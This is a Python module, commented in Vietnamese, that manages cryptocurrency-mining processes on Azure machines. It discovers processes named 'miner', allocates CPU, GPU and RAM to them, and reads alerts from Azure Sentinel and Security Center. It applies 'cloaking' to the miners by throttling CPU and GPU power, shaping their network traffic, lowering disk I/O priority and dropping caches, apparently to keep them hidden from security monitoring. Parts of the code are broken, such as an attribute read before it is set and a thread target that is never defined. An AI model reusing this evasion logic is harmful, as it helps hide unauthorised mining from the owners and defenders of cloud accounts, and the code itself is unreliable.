# system_manager.py

"""
system_manager.py

Module quản lý hệ thống khai thác tiền điện tử.
Thực hiện các chức năng:
- Quản lý và điều chỉnh tài nguyên hệ thống
- Phát hiện bất thường và áp dụng cloaking
- Tương tác với các dịch vụ Azure để giám sát và bảo mật
"""

import os
import sys
import json
import torch
import psutil
import pynvml
import subprocess
import datetime
from pathlib import Path
from threading import Thread, Lock, Event
from time import sleep
import functools
from queue import Queue, Empty

# Import từ Azure SDKs
from azure.monitor.query import MonitorClient, MetricAggregationType
from azure.mgmt.security import SecurityCenterClient
from azure.loganalytics import LogAnalyticsDataClient, models
from azure.mgmt.network import NetworkManagementClient
from azure.identity import ClientSecretCredential

# Import cấu hình logging chung
from logging_config import setup_logging

# Import các hàm từ cgroup_manager.py
from auxiliary_modules.cgroup_manager import setup_cgroups, assign_process_to_cgroups

# Import các module phụ trợ
import temperature_monitor
import power_management

# Đường dẫn tới các thư mục và cấu hình từ biến môi trường
CONFIG_DIR = Path(os.getenv('CONFIG_DIR', '/app/mining_environment/config'))
MODELS_DIR = Path(os.getenv('MODELS_DIR', '/app/mining_environment/models'))
LOGS_DIR = Path(os.getenv('LOGS_DIR', '/app/mining_environment/logs'))

# Đường dẫn tới các mô hình AI
RESOURCE_OPTIMIZATION_MODEL_PATH = MODELS_DIR / "resource_optimization_model.pt"
ANOMALY_CLOAKING_MODEL_PATH = MODELS_DIR / "anomaly_cloaking_model.pt"

# Thiết lập logger cho cả ResourceManager và AnomalyDetector
logger = setup_logging('system_manager', LOGS_DIR / 'system_manager.log', 'INFO')


def retry(ExceptionToCheck, tries=4, delay=3, backoff=2):
    """
    Decorator để tự động thử lại một hàm khi gặp ngoại lệ.
    """
    def deco_retry(f):
        @functools.wraps(f)
        def f_retry(*args, **kwargs):
            mtries, mdelay = tries, delay
            while mtries > 1:
                try:
                    return f(*args, **kwargs)
                except ExceptionToCheck as e:
                    logger.warning(f"Lỗi {e}, thử lại sau {mdelay} giây...")
                    sleep(mdelay)
                    mtries -= 1
                    mdelay *= backoff
            return f(*args, **kwargs)
        return f_retry
    return deco_retry


class MiningProcess:
    """
    Lớp đại diện cho một tiến trình khai thác, bao gồm các thông số sử dụng tài nguyên.
    """
    def __init__(self, pid, name, priority=1, network_interface='eth0'):
        self.pid = pid
        self.name = name
        self.priority = priority  # Giá trị ưu tiên (1 là thấp nhất)
        self.cpu_usage = 0.0
        self.gpu_usage = 0.0
        self.memory_usage = 0.0
        self.disk_io = 0.0
        self.network_io = 0.0
        self.mark = pid % 65535  # Giả sử mark là PID modulo 65535
        self.network_interface = network_interface

    def update_resource_usage(self):
        try:
            proc = psutil.Process(self.pid)
            self.cpu_usage = proc.cpu_percent(interval=0.1)
            self.memory_usage = proc.memory_percent()
            io_counters = proc.io_counters()
            self.disk_io = (io_counters.read_bytes + io_counters.write_bytes) / (1024 * 1024)  # MB
            net_io = psutil.net_io_counters(pernic=True)
            if self.network_interface in net_io:
                self.network_io = (net_io[self.network_interface].bytes_sent + net_io[self.network_interface].bytes_recv) / (1024 * 1024)  # MB
            else:
                self.network_io = 0.0
        except psutil.NoSuchProcess:
            self.cpu_usage = self.memory_usage = self.disk_io = self.network_io = 0.0
        except Exception as e:
            logger.error(f"Lỗi khi cập nhật tài nguyên cho tiến trình {self.name} (PID: {self.pid}): {e}")


class CloakStrategy:
    """
    Lớp cơ sở cho các chiến lược cloaking khác nhau.
    """
    def apply(self, process):
        raise NotImplementedError("Phương thức apply phải được triển khai.")


class CpuCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking cho CPU.
    """
    def __init__(self, config, logger):
        self.throttle_percentage = config.get('throttle_percentage', 20)
        self.freq_adjustment = config.get('frequency_adjustment_mhz', 2000)
        self.logger = logger

    @retry(Exception, tries=3, delay=2, backoff=2)
    def apply(self, process):
        try:
            assign_process_to_cgroups(process.pid, {'cpu_freq': self.freq_adjustment}, self.logger)
            self.logger.info(f"Throttled CPU frequency to {self.freq_adjustment}MHz ({self.throttle_percentage}% reduction) cho tiến trình {process.name} (PID: {process.pid}).")
        except Exception as e:
            self.logger.error(f"Lỗi khi throttling CPU cho tiến trình {process.name} (PID: {process.pid}): {e}")
            raise


class GpuCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking cho GPU.
    """
    def __init__(self, config, logger, gpu_initialized):
        self.throttle_percentage = config.get('throttle_percentage', 20)
        self.logger = logger
        self.gpu_initialized = gpu_initialized

    @retry(Exception, tries=3, delay=2, backoff=2)
    def apply(self, process):
        if not self.gpu_initialized:
            self.logger.warning(f"GPU không được khởi tạo. Không thể áp dụng GPU Cloaking cho tiến trình {process.name} (PID: {process.pid}).")
            return
        try:
            GPU_COUNT = pynvml.nvmlDeviceGetCount()
            gpu_index = process.pid % GPU_COUNT  # Phân phối GPU dựa trên PID
            handle = pynvml.nvmlDeviceGetHandleByIndex(gpu_index)
            current_power_limit = pynvml.nvmlDeviceGetPowerManagementLimit(handle)
            new_power_limit = int(current_power_limit * (1 - self.throttle_percentage / 100))
            pynvml.nvmlDeviceSetPowerManagementLimit(handle, new_power_limit)
            self.logger.info(f"Throttled GPU {gpu_index} power limit to {new_power_limit}W ({self.throttle_percentage}% reduction) cho tiến trình {process.name} (PID: {process.pid}).")
        except pynvml.NVMLError as e:
            self.logger.error(f"Lỗi khi throttling GPU cho tiến trình {process.name} (PID: {process.pid}): {e}")
            raise
        except Exception as e:
            self.logger.error(f"Lỗi không lường trước khi throttling GPU cho tiến trình {process.name} (PID: {process.pid}): {e}")
            raise


class NetworkCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking cho Network.
    """
    def __init__(self, config, logger):
        self.bandwidth_reduction = config.get('bandwidth_reduction_mbps', 10)
        self.network_interface = config.get('network_interface', 'eth0')
        self.logger = logger

    def get_primary_network_interface(self):
        try:
            output = subprocess.check_output(['ip', 'route']).decode()
            for line in output.splitlines():
                if line.startswith('default'):
                    return line.split()[4]
            return 'eth0'
        except Exception as e:
            self.logger.error(f"Lỗi khi lấy giao diện mạng chính: {e}")
            return 'eth0'

    @retry(Exception, tries=3, delay=2, backoff=2)
    def apply(self, process):
        try:
            self.logger.info(f"Sử dụng giao diện mạng: {self.network_interface} cho tiến trình {process.name} (PID: {process.pid})")

            existing_qdiscs = subprocess.check_output(['tc', 'qdisc', 'show', 'dev', self.network_interface]).decode()
            if 'htb' not in existing_qdiscs:
                subprocess.run([
                    'tc', 'qdisc', 'add', 'dev', self.network_interface, 'root', 'handle', '1:0', 'htb',
                    'default', '12'
                ], check=True)
                self.logger.info(f"Thêm qdisc HTB trên {self.network_interface} cho tiến trình {process.name} (PID: {process.pid})")
        except subprocess.CalledProcessError as e:
            if "already exists" in str(e):
                self.logger.info(f"qdisc HTB đã tồn tại trên {self.network_interface} cho tiến trình {process.name} (PID: {process.pid})")
            else:
                self.logger.error(f"Lỗi khi kiểm tra hoặc thêm qdisc HTB: {e}")
                raise
        except Exception as e:
            self.logger.error(f"Lỗi khi thiết lập qdisc HTB: {e}")
            raise

        try:
            class_id = f'1:{process.mark}'
            bw_limit_mbps = self.bandwidth_reduction

            existing_classes = subprocess.check_output(['tc', 'class', 'show', 'dev', self.network_interface, 'parent', '1:0']).decode()
            if class_id not in existing_classes:
                subprocess.run([
                    'tc', 'class', 'add', 'dev', self.network_interface, 'parent', '1:0', 'classid', class_id,
                    'htb', 'rate', f"{bw_limit_mbps}mbit"
                ], check=True)
                self.logger.info(f"Thêm class {class_id} với rate {bw_limit_mbps} Mbps trên {self.network_interface} cho tiến trình {process.name} (PID: {process.pid})")
        except subprocess.CalledProcessError as e:
            if "already exists" in str(e):
                self.logger.info(f"Class {class_id} đã tồn tại trên {self.network_interface} cho tiến trình {process.name} (PID: {process.pid})")
            else:
                self.logger.error(f"Lỗi khi thêm class {class_id}: {e}")
                raise
        except Exception as e:
            self.logger.error(f"Lỗi khi thiết lập class {class_id}: {e}")
            raise

        try:
            subprocess.run([
                'iptables', '-t', 'mangle', '-A', 'OUTPUT', '-p', 'tcp', '-m', 'owner', '--pid-owner', str(process.pid), '-j', 'MARK', '--set-mark', str(process.mark)
            ], check=True)
            self.logger.info(f"Đã đánh dấu các gói cho tiến trình {process.name} (PID: {process.pid}) với mark {process.mark}")

            existing_filters = subprocess.check_output(['tc', 'filter', 'show', 'dev', self.network_interface, 'parent', '1:0', 'protocol', 'ip']).decode()
            filter_exists = f'handle {process.mark} fw flowid {class_id}' in existing_filters
            if not filter_exists:
                subprocess.run([
                    'tc', 'filter', 'add', 'dev', self.network_interface, 'protocol', 'ip', 'parent',
                    '1:0', 'prio', '1', 'handle', str(process.mark), 'fw', 'flowid', class_id
                ], check=True)
                self.logger.info(f"Thêm filter cho mark {process.mark} trên {self.network_interface} để gán vào class {class_id}")
            else:
                self.logger.info(f"Filter cho mark {process.mark} đã tồn tại trên {self.network_interface} cho tiến trình {process.name} (PID: {process.pid})")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Lỗi khi thêm filter cho băng thông mạng: {e}")
            raise
        except Exception as e:
            self.logger.error(f"Lỗi khi thiết lập filter cho băng thông mạng: {e}")
            raise


class DiskIoCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking cho Disk I/O.
    """
    def __init__(self, config, logger):
        self.io_throttling_level = config.get('io_throttling_level', 'idle')
        self.logger = logger

    @retry(Exception, tries=3, delay=2, backoff=2)
    def apply(self, process):
        try:
            existing_ionice = subprocess.check_output(['ionice', '-p', str(process.pid)], stderr=subprocess.STDOUT).decode()
            if 'idle' not in existing_ionice.lower():
                subprocess.run(['ionice', '-c', '3', '-p', str(process.pid)], check=True)
                self.logger.info(f"Set disk I/O throttling level to {self.io_throttling_level} cho tiến trình {process.name} (PID: {process.pid}).")
            else:
                self.logger.info(f"Disk I/O throttling đã được áp dụng cho tiến trình {process.name} (PID: {process.pid}).")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Lỗi khi throttling Disk I/O cho tiến trình {process.name} (PID: {process.pid}): {e}")
            raise
        except Exception as e:
            self.logger.error(f"Lỗi khi throttling Disk I/O cho tiến trình {process.name} (PID: {process.pid}): {e}")
            raise


class CacheCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking cho Cache.
    """
    def __init__(self, config, logger):
        self.cache_limit_percent = config.get('cache_limit_percent', 50)
        self.logger = logger

    @retry(Exception, tries=3, delay=2, backoff=2)
    def apply(self, process):
        try:
            with open('/proc/sys/vm/drop_caches', 'w') as f:
                f.write('3\n')  # Drop pagecache, dentries và inodes
            self.logger.info(f"Throttled cache to {self.cache_limit_percent}% bằng cách drop caches cho tiến trình {process.name} (PID: {process.pid}).")
        except PermissionError:
            self.logger.error(f"Không có quyền để drop caches. Throttling cache thất bại cho tiến trình {process.name} (PID: {process.pid}).")
            raise
        except Exception as e:
            self.logger.error(f"Lỗi khi throttling cache cho tiến trình {process.name} (PID: {process.pid}): {e}")
            raise


class AzureMonitorClient:
    """
    Lớp để tương tác với Azure Monitor.
    """
    def __init__(self):
        self.client = self.authenticate()
        self.subscription_id = os.getenv('AZURE_SUBSCRIPTION_ID')

    def authenticate(self):
        client_id = os.getenv('AZURE_CLIENT_ID')
        client_secret = os.getenv('AZURE_CLIENT_SECRET')
        tenant_id = os.getenv('AZURE_TENANT_ID')

        credential = ClientSecretCredential(
            client_id=client_id,
            client_secret=client_secret,
            tenant_id=tenant_id
        )
        return MonitorClient(credential, self.subscription_id)

    def get_metrics(self, resource_id, metric_names, timespan='PT1H', interval='PT1M'):
        try:
            metrics_data = self.client.metrics.list(
                resource_id,
                timespan=timespan,
                interval=interval,
                metricnames=','.join(metric_names),
                aggregation=MetricAggregationType.AVERAGE
            )
            metrics = {}
            for metric in metrics_data.value:
                metrics[metric.name.value] = [datapoint.average for datapoint in metric.timeseries[0].data]
            return metrics
        except Exception as e:
            logger.error(f"Lỗi khi lấy metrics từ Azure Monitor: {e}")
            return {}


class AzureSentinelClient:
    """
    Lớp để tương tác với Azure Sentinel.
    """
    def __init__(self):
        self.client = self.authenticate()
        self.subscription_id = os.getenv('AZURE_SUBSCRIPTION_ID')

    def authenticate(self):
        client_id = os.getenv('AZURE_CLIENT_ID')
        client_secret = os.getenv('AZURE_CLIENT_SECRET')
        tenant_id = os.getenv('AZURE_TENANT_ID')

        credential = ClientSecretCredential(
            client_id=client_id,
            client_secret=client_secret,
            tenant_id=tenant_id
        )
        return SecurityCenterClient(credential, self.subscription_id)

    def get_recent_alerts(self, days=1):
        try:
            alerts = self.client.alerts.list()
            recent_alerts = []
            cutoff_time = datetime.datetime.utcnow() - datetime.timedelta(days=days)
            for alert in alerts:
                if alert.created_time and alert.created_time >= cutoff_time:
                    recent_alerts.append(alert)
            return recent_alerts
        except Exception as e:
            logger.error(f"Lỗi khi lấy alerts từ Azure Sentinel: {e}")
            return []


class AzureLogAnalyticsClient:
    """
    Lớp để tương tác với Azure Log Analytics.
    """
    def __init__(self):
        self.client = self.authenticate()
        self.workspace_id = os.getenv('AZURE_LOG_ANALYTICS_WORKSPACE_ID')

    def authenticate(self):
        client_id = os.getenv('AZURE_CLIENT_ID')
        client_secret = os.getenv('AZURE_CLIENT_SECRET')
        tenant_id = os.getenv('AZURE_TENANT_ID')

        credential = ClientSecretCredential(
            client_id=client_id,
            client_secret=client_secret,
            tenant_id=tenant_id
        )
        return LogAnalyticsDataClient(credential)

    def query_logs(self, query, timespan="P1D"):
        try:
            body = models.QueryBody(query=query, timespan=timespan)
            response = self.client.query(workspace_id=self.workspace_id, body=body)
            return response.tables
        except Exception as e:
            logger.error(f"Lỗi khi truy vấn logs từ Azure Log Analytics: {e}")
            return []


class AzureSecurityCenterClient:
    """
    Lớp để tương tác với Azure Security Center.
    """
    def __init__(self):
        self.client = self.authenticate()
        self.subscription_id = os.getenv('AZURE_SUBSCRIPTION_ID')

    def authenticate(self):
        client_id = os.getenv('AZURE_CLIENT_ID')
        client_secret = os.getenv('AZURE_CLIENT_SECRET')
        tenant_id = os.getenv('AZURE_TENANT_ID')

        credential = ClientSecretCredential(
            client_id=client_id,
            client_secret=client_secret,
            tenant_id=tenant_id
        )
        return SecurityCenterClient(credential, self.subscription_id)

    def get_security_recommendations(self):
        try:
            recommendations = self.client.security_recommendations.list()
            return list(recommendations)
        except Exception as e:
            logger.error(f"Lỗi khi lấy security recommendations từ Azure Security Center: {e}")
            return []


class AzureNetworkWatcherClient:
    """
    Lớp để tương tác với Azure Network Watcher.
    """
    def __init__(self):
        self.client = self.authenticate()
        self.subscription_id = os.getenv('AZURE_SUBSCRIPTION_ID')

    def authenticate(self):
        client_id = os.getenv('AZURE_CLIENT_ID')
        client_secret = os.getenv('AZURE_CLIENT_SECRET')
        tenant_id = os.getenv('AZURE_TENANT_ID')

        credential = ClientSecretCredential(
            client_id=client_id,
            client_secret=client_secret,
            tenant_id=tenant_id
        )
        return NetworkManagementClient(credential, self.subscription_id)

    def get_flow_logs(self, resource_group, network_watcher_name, nsg_name):
        try:
            flow_logs = self.client.network_security_groups.list_flow_logs(
                resource_group_name=resource_group,
                network_security_group_name=nsg_name
            )
            return list(flow_logs)
        except Exception as e:
            logger.error(f"Lỗi khi lấy flow logs từ Azure Network Watcher: {e}")
            return []

    def get_traffic_analytics(self, workspace_id):
        # Phần này có thể cần tùy chỉnh dựa trên API Traffic Analytics cụ thể
        pass


class AzureTrafficAnalyticsClient:
    """
    Lớp để tương tác với Azure Traffic Analytics.
    """
    def __init__(self):
        self.client = self.authenticate()
        self.workspace_id = os.getenv('AZURE_TRAFFIC_ANALYTICS_WORKSPACE_ID')

    def authenticate(self):
        client_id = os.getenv('AZURE_CLIENT_ID')
        client_secret = os.getenv('AZURE_CLIENT_SECRET')
        tenant_id = os.getenv('AZURE_TENANT_ID')

        credential = ClientSecretCredential(
            client_id=client_id,
            client_secret=client_secret,
            tenant_id=tenant_id
        )
        # Giả sử có một client TrafficAnalyticsClient tương tự như các client khác
        return None  # Thay thế bằng TrafficAnalyticsClient nếu có

    def get_traffic_data(self):
        # Implement API calls để lấy dữ liệu Traffic Analytics
        pass


class ResourceManager:
    """
    Lớp quản lý và điều chỉnh tài nguyên hệ thống, bao gồm phân phối tải động.
    """
    _instance = None
    _instance_lock = Lock()

    def __new__(cls, *args, **kwargs):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super(ResourceManager, cls).__new__(cls)
        return cls._instance

    def __init__(self):
        if hasattr(self, '_initialized') and self._initialized:
            return
        self._initialized = True

        # Tải cấu hình và mô hình AI
        self.config = self.load_config()
        self.resource_optimization_model, self.device = self.load_model(RESOURCE_OPTIMIZATION_MODEL_PATH)

        # Sự kiện để dừng các luồng
        self.stop_event = Event()

        # Khởi tạo các Lock cụ thể cho từng loại tài nguyên
        self.resource_lock = Lock()  # General lock for resource state

        # Danh sách tiến trình khai thác
        self.mining_processes = []
        self.mining_processes_lock = Lock()

        # Khởi tạo các luồng nhưng không bắt đầu
        self.monitor_thread = Thread(target=self.monitor_and_adjust, name="MonitorThread", daemon=True)
        self.optimization_thread = Thread(target=self.optimize_resources, name="OptimizationThread", daemon=True)
        self.cloaking_thread = Thread(target=self.process_cloaking_requests, name="CloakingThread", daemon=True)

        # Initialize NVML once
        try:
            pynvml.nvmlInit()
            self.gpu_initialized = True
            logger.info("NVML initialized successfully.")
        except pynvml.NVMLError as e:
            logger.error(f"Failed to initialize NVML: {e}")
            self.gpu_initialized = False

        # Hàng đợi để xử lý yêu cầu cloaking từ AnomalyDetector
        self.cloaking_request_queue = Queue()

        # Khởi tạo các client Azure
        self.azure_monitor_client = AzureMonitorClient()
        self.azure_sentinel_client = AzureSentinelClient()
        self.azure_log_analytics_client = AzureLogAnalyticsClient()
        self.azure_security_center_client = AzureSecurityCenterClient()
        self.azure_network_watcher_client = AzureNetworkWatcherClient()
        self.azure_traffic_analytics_client = AzureTrafficAnalyticsClient()

    @classmethod
    def get_instance(cls):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = cls()
        return cls._instance

    def load_config(self):
        config_path = CONFIG_DIR / "resource_config.json"
        try:
            with open(config_path, 'r') as f:
                config = json.load(f)
            logger.info(f"Đã tải cấu hình từ {config_path}")
            self.validate_config(config)
            return config
        except FileNotFoundError:
            logger.error(f"Tệp cấu hình không tồn tại: {config_path}")
            raise
        except json.JSONDecodeError as e:
            logger.error(f"Lỗi cú pháp JSON trong tệp {config_path}: {e}")
            raise

    def validate_config(self, config):
        required_keys = [
            "resource_allocation",
            "temperature_limits",
            "power_limits",
            "monitoring_parameters",
            "optimization_parameters",
            "cloak_strategies",
            "process_priority_map",
            "ai_driven_monitoring",
            "resource_group",
            "vm_name",
            "network_watcher_name",
            "nsg_name"
        ]
        for key in required_keys:
            if key not in config:
                logger.error(f"Thiếu khóa cấu hình: {key}")
                raise KeyError(f"Thiếu khóa cấu hình: {key}")
        # Thêm các kiểm tra chi tiết hơn nếu cần thiết

    @retry(Exception, tries=3, delay=2, backoff=2)
    def load_model(self, model_path):
        if not Path(model_path).exists():
            logger.error(f"Mô hình AI không tồn tại tại: {model_path}")
            raise FileNotFoundError(f"Mô hình AI không tồn tại tại: {model_path}")
        device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
        try:
            model = torch.load(model_path, map_location=device)
            model.eval()  # Đặt model vào chế độ đánh giá để không cập nhật gradient
            logger.info(f"Đã tải mô hình AI từ {model_path}")
            return model, device
        except Exception as e:
            logger.error(f"Lỗi khi tải mô hình AI từ {model_path}: {e}")
            raise e

    def discover_mining_processes(self):
        with self.mining_processes_lock:
            self.mining_processes.clear()
            for proc in psutil.process_iter(['pid', 'name']):
                if 'miner' in proc.info['name'].lower():
                    priority = self.get_process_priority(proc.info['name'])
                    network_interface = self.config.get('network_interface', 'eth0')
                    mining_proc = MiningProcess(proc.info['pid'], proc.info['name'], priority, network_interface)
                    self.mining_processes.append(mining_proc)
            logger.info(f"Đã phát hiện {len(self.mining_processes)} tiến trình khai thác.")

    def get_process_priority(self, process_name):
        priority_map = self.config.get('process_priority_map', {})
        return priority_map.get(process_name.lower(), 1)

    def monitor_and_adjust(self):
        monitoring_params = self.config.get("monitoring_parameters", {})
        temperature_check_interval = monitoring_params.get("temperature_monitoring_interval_seconds", 10)
        power_check_interval = monitoring_params.get("power_monitoring_interval_seconds", 10)
        azure_monitor_interval = monitoring_params.get("azure_monitor_interval_seconds", 300)  # 5 phút
        while not self.stop_event.is_set():
            try:
                self.discover_mining_processes()
                self.allocate_resources_with_priority()

                temperature_limits = self.config.get("temperature_limits", {})
                cpu_max_temp = temperature_limits.get("cpu_max_celsius", 75)
                gpu_max_temp = temperature_limits.get("gpu_max_celsius", 85)

                for process in self.mining_processes:
                    self.adjust_resources_based_on_temperature(process, cpu_max_temp, gpu_max_temp)

                power_limits = self.config.get("power_limits", {})
                cpu_max_power = power_limits.get("per_device_power_watts", {}).get("cpu", 150)
                gpu_max_power = power_limits.get("per_device_power_watts", {}).get("gpu", 300)

                for process in self.mining_processes:
                    cpu_power = power_management.get_cpu_power(process.pid)
                    gpu_power = power_management.get_gpu_power(process.pid) if self.gpu_initialized else 0

                    if cpu_power > cpu_max_power:
                        logger.warning(f"CPU power {cpu_power}W của tiến trình {process.name} (PID: {process.pid}) vượt quá {cpu_max_power}W. Điều chỉnh tài nguyên.")
                        power_management.reduce_cpu_power(process.pid)
                        self.adjust_cpu_frequency_based_load(process, psutil.cpu_percent(interval=1))
                        # Sử dụng assign_process_to_cgroups để cập nhật cgroups thay vì pin_process_to_cpu
                        assign_process_to_cgroups(process.pid, {'cpu_threads': 1}, logger)
                        # Thêm logic bổ sung nếu cần

                    if gpu_power > gpu_max_power:
                        logger.warning(f"GPU power {gpu_power}W của tiến trình {process.name} (PID: {process.pid}) vượt quá {gpu_max_power}W. Điều chỉnh tài nguyên.")
                        power_management.reduce_gpu_power(process.pid)
                        # Thêm logic bổ sung nếu cần

                # Thu thập dữ liệu từ Azure Monitor định kỳ
                if self.should_collect_azure_monitor_data():
                    self.collect_azure_monitor_data()

                # Các bước thu thập dữ liệu Azure khác có thể được thêm vào đây

            except Exception as e:
                logger.error(f"Lỗi trong quá trình giám sát và điều chỉnh: {e}")
            sleep(max(temperature_check_interval, power_check_interval))

    def should_collect_azure_monitor_data(self):
        # Logic để xác định khi nào nên thu thập dữ liệu Azure Monitor
        # Ví dụ: sử dụng timestamp hoặc đếm số lần đã thu thập
        return True  # Hoặc điều kiện cụ thể

    def collect_azure_monitor_data(self):
        # Ví dụ: Lấy CPU và Memory metrics từ Azure Monitor
        resource_id = f"/subscriptions/{self.subscription_id}/resourceGroups/{self.config['resource_group']}/providers/Microsoft.Compute/virtualMachines/{self.config['vm_name']}"
        metric_names = ['Percentage CPU', 'Available Memory Bytes']
        metrics = self.azure_monitor_client.get_metrics(resource_id, metric_names)
        logger.info(f"Đã thu thập metrics từ Azure Monitor: {metrics}")
        # Xử lý metrics và điều chỉnh tài nguyên nếu cần thiết
        # Ví dụ: Nếu CPU sử dụng quá cao, điều chỉnh tài nguyên

    def adjust_resources_based_on_temperature(self, process, cpu_max_temp, gpu_max_temp):
        try:
            cpu_temp = temperature_monitor.get_cpu_temperature(process.pid)
            gpu_temp = temperature_monitor.get_gpu_temperature(process.pid) if self.gpu_initialized else 0

            if cpu_temp > cpu_max_temp:
                logger.warning(f"Nhiệt độ CPU {cpu_temp}°C của tiến trình {process.name} (PID: {process.pid}) vượt quá {cpu_max_temp}°C. Điều chỉnh tài nguyên.")
                self.throttle_cpu(process)

            if gpu_temp > gpu_max_temp:
                logger.warning(f"Nhiệt độ GPU {gpu_temp}°C của tiến trình {process.name} (PID: {process.pid}) vượt quá {gpu_max_temp}°C. Điều chỉnh tài nguyên.")
                self.adjust_gpu_usage(process)
        except Exception as e:
            logger.error(f"Lỗi khi điều chỉnh tài nguyên dựa trên nhiệt độ cho tiến trình {process.name} (PID: {process.pid}): {e}")

    def allocate_resources_with_priority(self):
        with self.resource_lock, self.mining_processes_lock:
            sorted_processes = sorted(self.mining_processes, key=lambda p: p.priority, reverse=True)
            total_cpu_cores = psutil.cpu_count(logical=True)
            allocated_cores = 0

            for process in sorted_processes:
                if allocated_cores >= total_cpu_cores:
                    logger.warning(f"Không còn lõi CPU để phân bổ cho tiến trình {process.name} (PID: {process.pid}).")
                    continue

                available_cores = total_cpu_cores - allocated_cores
                cores_to_allocate = min(process.priority, available_cores)
                cpu_threads = cores_to_allocate  # Giả định mỗi thread tương ứng với một lõi

                # Sử dụng assign_process_to_cgroups thay vì pin_process_to_cpu
                assign_process_to_cgroups(process.pid, {'cpu_threads': cpu_threads}, logger)
                allocated_cores += cores_to_allocate

                if self.gpu_initialized:
                    self.adjust_gpu_usage(process)

                ram_limit_mb = self.config['resource_allocation']['ram'].get('max_allocation_mb', 1024)
                self.set_ram_limit(process.pid, ram_limit_mb)

    def set_ram_limit(self, pid, ram_limit_mb):
        try:
            # Sử dụng assign_process_to_cgroups để thiết lập RAM limit
            assign_process_to_cgroups(pid, {'memory': ram_limit_mb}, logger)
            logger.info(f"Đã thiết lập giới hạn RAM {ram_limit_mb}MB cho tiến trình PID: {pid}")
        except Exception as e:
            logger.error(f"Lỗi khi thiết lập giới hạn RAM cho tiến trình PID: {pid}: {e}")

    def adjust_gpu_usage(self, process):
        gpu_limits = self.config.get('resource_allocation', {}).get('gpu', {})
        throttle_percentage = gpu_limits.get('throttle_percentage', 50)
        try:
            GPU_COUNT = pynvml.nvmlDeviceGetCount()
            gpu_index = process.pid % GPU_COUNT  # Phân phối GPU dựa trên PID
            handle = pynvml.nvmlDeviceGetHandleByIndex(gpu_index)
            current_power_limit = pynvml.nvmlDeviceGetPowerManagementLimit(handle)
            new_power_limit = int(current_power_limit * (1 - throttle_percentage / 100))
            pynvml.nvmlDeviceSetPowerManagementLimit(handle, new_power_limit)
            logger.info(f"Điều chỉnh GPU {gpu_index} cho tiến trình {process.name} (PID: {process.pid}) thành {new_power_limit}W.")
        except pynvml.NVMLError as e:
            logger.error(f"Lỗi khi điều chỉnh GPU cho tiến trình {process.name} (PID: {process.pid}): {e}")
        except Exception as e:
            logger.error(f"Lỗi không lường trước khi điều chỉnh GPU cho tiến trình {process.name} (PID: {process.pid}): {e}")

    def throttle_cpu(self, process):
        with self.resource_lock:
            cpu_cloak = self.config['cloak_strategies'].get('cpu', {})
            throttle_percentage = cpu_cloak.get('throttle_percentage', 20)  # Mặc định giảm 20%
            freq_adjustment = cpu_cloak.get('frequency_adjustment_mhz', 2000)  # MHz

            try:
                assign_process_to_cgroups(process.pid, {'cpu_freq': freq_adjustment}, logger)
                logger.info(f"Throttled CPU frequency to {freq_adjustment}MHz ({throttle_percentage}% reduction) cho tiến trình {process.name} (PID: {process.pid}).")
            except Exception as e:
                logger.error(f"Lỗi khi throttling CPU cho tiến trình {process.name} (PID: {process.pid}): {e}")

    def pin_process_to_cpu(self, pid, cpu_ids):
        try:
            p = psutil.Process(pid)
            p.cpu_affinity(cpu_ids)
            logger.info(f"Đã gán tiến trình {pid} vào các CPU cores: {cpu_ids}")
        except psutil.NoSuchProcess:
            logger.warning(f"Không tìm thấy tiến trình PID: {pid} để gán CPU Pinning.")
        except Exception as e:
            logger.error(f"Lỗi khi gán tiến trình {pid} vào CPU cores {cpu_ids}: {e}")

    def adjust_cpu_frequency_based_load(self, process, load_percent):
        with self.resource_lock:
            try:
                if load_percent > 80:
                    new_freq = 2000  # MHz
                elif load_percent > 50:
                    new_freq = 2500  # MHz
                else:
                    new_freq = 3000  # MHz
                self.set_cpu_frequency(new_freq)
                logger.info(f"Đã điều chỉnh tần số CPU thành {new_freq} MHz cho tiến trình {process.name} (PID: {process.pid}) dựa trên tải {load_percent}%")
            except Exception as e:
                logger.error(f"Lỗi khi điều chỉnh tần số CPU dựa trên tải cho tiến trình {process.name} (PID: {process.pid}): {e}")

    @retry(Exception, tries=3, delay=2, backoff=2)
    def set_cpu_frequency(self, freq_mhz):
        try:
            assign_process_to_cgroups(None, {'cpu_freq': freq_mhz}, logger)  # Áp dụng cho tất cả các CPU cores
            logger.info(f"Đã thiết lập tần số CPU thành {freq_mhz} MHz cho tất cả các lõi.")
        except Exception as e:
            logger.error(f"Lỗi khi thiết lập tần số CPU: {e}")
            raise

    def process_cloaking_requests(self):
        while not self.stop_event.is_set():
            try:
                process = self.cloaking_request_queue.get(timeout=1)
                self.cloak_resources(['cpu', 'gpu', 'network', 'disk_io', 'cache'], process)
            except Empty:
                continue  # Không có yêu cầu, tiếp tục vòng lặp
            except Exception as e:
                logger.error(f"Lỗi trong process_cloaking_requests: {e}")

    def cloak_resources(self, strategies, process):
        try:
            for strategy in strategies:
                strategy_class = self.get_cloak_strategy_class(strategy)
                if strategy_class:
                    if strategy.lower() == 'gpu':
                        strategy_instance = strategy_class(self.config['cloak_strategies'].get(strategy, {}), logger, self.gpu_initialized)
                    else:
                        strategy_instance = strategy_class(self.config['cloak_strategies'].get(strategy, {}), logger)
                    strategy_instance.apply(process)
                else:
                    logger.warning(f"Không tìm thấy chiến lược cloaking: {strategy}")
            logger.info(f"Cloaking strategies executed successfully cho tiến trình {process.name} (PID: {process.pid}).")
        except Exception as e:
            logger.error(f"Lỗi khi thực hiện cloaking cho tiến trình {process.name} (PID: {process.pid}): {e}")

    def get_cloak_strategy_class(self, strategy_name):
        strategies = {
            'cpu': CpuCloakStrategy,
            'gpu': GpuCloakStrategy,
            'network': NetworkCloakStrategy,
            'disk_io': DiskIoCloakStrategy,
            'cache': CacheCloakStrategy
            # Thêm các chiến lược khác ở đây
        }
        return strategies.get(strategy_name.lower())

    def start(self):
        logger.info("Đang khởi động ResourceManager...")
        self.discover_mining_processes()
        self.monitor_thread.start()
        self.optimization_thread.start()
        self.cloaking_thread.start()
